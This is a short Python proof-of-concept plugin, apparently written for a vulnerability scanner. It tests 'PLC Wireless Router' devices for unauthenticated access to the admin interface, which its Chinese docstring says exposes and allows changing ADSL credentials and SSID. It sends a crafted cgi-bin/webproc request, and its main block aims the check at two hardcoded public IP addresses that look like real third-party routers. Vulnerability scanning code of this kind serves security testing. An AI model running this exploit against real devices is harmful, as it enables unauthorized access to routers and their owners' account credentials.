#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  : PLC Wireless Router 未授权访问 ，可获取和更改路由器所有内容（asdl账号，ssid等）
Author    :  a
mail      :  a@lcx.cc
refer     :  http://wooyun.org/bugs/wooyun-2015-0122195



"""
import urlparse
import time

def assign(service, arg):
    if service == 'plc_router':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
     
    payload="cgi-bin/webproc?getpage=html/index.html&errorpage=html/main.html&var:language=zh_cn&var:menu=setup&var:page=connected&var:retag=1&var:subpage=-"
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    if code==200 and 'Default Gateway Mode' in res and 'Current Default Gateway' in res:
        security_hole(target)
    

    

if __name__ == '__main__':
    from dummy import *
    audit(assign('plc_router', 'http://59.153.96.119:8080')[1])
    audit(assign('plc_router', 'http://202.44.232.151:8080')[1])